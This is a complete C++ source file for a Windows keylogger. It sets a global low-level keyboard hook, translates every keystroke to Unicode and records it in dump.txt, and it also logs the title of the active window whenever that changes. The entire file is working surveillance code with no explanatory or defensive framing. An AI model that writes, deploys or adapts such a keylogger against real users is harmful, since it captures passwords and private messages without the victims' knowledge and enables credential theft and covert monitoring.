#include <Windows.h>
#include <fstream>
#include <locale>

using namespace std;

wofstream dump;
HKL keyboardLayout;

void GetActualKeyboardState(unsigned char *keyboardState)
{
    for (int i = 0; i < 256; ++i)
        keyboardState[i] = static_cast<unsigned char>(::GetKeyState(i));
}

LRESULT CALLBACK KeyboardHook(int code, WPARAM wParam, LPARAM lParam)
{
    static wstring currentTitle;

    if (code == HC_ACTION && (wParam == WM_KEYDOWN))
    {
        HWND currentWindow = GetForegroundWindow();
        wchar_t title[512];
        GetWindowText(currentWindow, title, 512);
        wstring newTitle = wstring(title);

        if (newTitle != currentTitle)
        {
            dump << endl << L"----------------------------" << endl;
            dump << L"Active window: " << newTitle.c_str() << endl;
            currentTitle = newTitle;
        }

        LPKBDLLHOOKSTRUCT data = reinterpret_cast<LPKBDLLHOOKSTRUCT>(lParam);

        unsigned char keyboardState[256];
        GetActualKeyboardState(keyboardState);

        wchar_t buffer[16];
        memset(buffer, 0, sizeof(buffer));

        int result = ::ToUnicodeEx(data->vkCode, data->scanCode, keyboardState, buffer, 16, 0, keyboardLayout);
        if (result > 0)
        {
            dump << buffer;
            dump.flush();
        }
    }

    // Pass the message to any other hooks further up the chain
    return ::CallNextHookEx(nullptr, code, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE instance, HINSTANCE prevInstance, LPSTR commandLine, int show)
{
    locale::global(locale(""));

    dump.open("dump.txt", fstream::out);
    dump << L"Startup" << endl;
    dump << L"----------------------------" << endl;

    keyboardLayout = ::GetKeyboardLayout(0);

    HHOOK hookHandle = ::SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, nullptr, 0);

    MSG message;
    while (::GetMessage(&message, nullptr, 0, 0) > 0)
    {
        if (message.message == WM_QUIT)
            break;

        ::TranslateMessage(&message);
        ::DispatchMessage(&message);
    }

    ::UnhookWindowsHookEx(hookHandle);

    dump << endl << L"----------------------------" << endl;
    dump << L"Shutting down" << endl;
    dump.flush();
    dump.close();

    return 0;
}
